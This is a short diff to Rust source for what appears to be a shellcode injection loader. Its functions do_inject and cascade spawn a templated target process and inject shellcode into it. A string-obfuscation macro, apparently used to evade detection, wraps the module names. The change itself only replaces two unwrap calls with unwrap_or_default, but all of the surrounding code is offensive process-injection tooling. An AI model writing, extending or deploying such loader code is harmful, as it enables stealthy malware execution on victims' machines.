@@ -228,7 +228,7 @@ unsafe fn find_shims_flag(base: usize, offset_addr: usize) -> Option<usize> {
 }
 
 unsafe fn do_inject(pi: &PROCESS_INFORMATION, sc: &[u8]) -> bool {
-    let ntdll = CString::new(lc!("ntdll")).unwrap();
+    let ntdll = CString::new(lc!("ntdll")).unwrap_or_default();
     let h_ntdll = GetModuleHandleA(ntdll.as_ptr());
     if h_ntdll.is_null() {
         return false;
@@ -332,7 +332,7 @@ unsafe fn do_inject(pi: &PROCESS_INFORMATION, sc: &[u8]) -> bool {
 fn cascade(sc: &[u8]) {
     unsafe {
         let mut cmd = CString::new({{TARGET_PROCESS}})
-            .unwrap()
+            .unwrap_or_default()
             .into_bytes_with_nul();
         let mut si: STARTUPINFOA = mem::zeroed();
         si.cb = mem::size_of::<STARTUPINFOA>() as u32;
